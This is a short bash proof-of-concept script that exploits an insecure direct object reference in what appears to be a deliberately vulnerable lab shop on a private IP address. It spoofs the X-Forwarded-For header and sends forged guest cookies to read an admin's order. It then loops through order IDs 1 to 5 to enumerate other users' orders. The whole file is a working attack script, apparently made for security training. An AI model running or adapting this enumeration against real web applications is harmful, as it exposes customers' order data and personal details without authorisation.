#!/bin/bash
# IDOR (Insecure Direct Object Reference) Test PoC
# Target: VULN SHOP Order Details

TARGET="http://192.168.0.28:3000"
MY_IP="10.0.0.101"

echo "[*] IDOR Test - Order Information Disclosure"
echo "[*] Target: $TARGET/order?id="
echo ""

# Login as guest (user_id=2) but access admin's order (id=1)
echo "[+] Logged in as guest (user_id=2), attempting to access order ID 1 (belongs to admin)..."
curl -s -H "X-Forwarded-For: $MY_IP" \
  -H "Cookie: user=guest; isAdmin=false; user_id=2" \
  "$TARGET/order?id=1" | grep -E "(ORDER|PRODUCT|TOTAL|User ID)"

echo ""
echo "[+] Enumerating orders 1-5..."
for i in {1..5}; do
  echo "--- Order ID: $i ---"
  result=$(curl -s -H "X-Forwarded-For: $MY_IP" \
    -H "Cookie: user=guest; isAdmin=false; user_id=2" \
    "$TARGET/order?id=$i")

  if echo "$result" | grep -q "ORDER #"; then
    echo "$result" | grep -oP 'ORDER #\d+' | head -1
    echo "$result" | grep -oP 'User ID: \d+' | head -1
  else
    echo "Order not found or access denied"
  fi
  echo ""
done

echo "[*] IDOR test complete!"
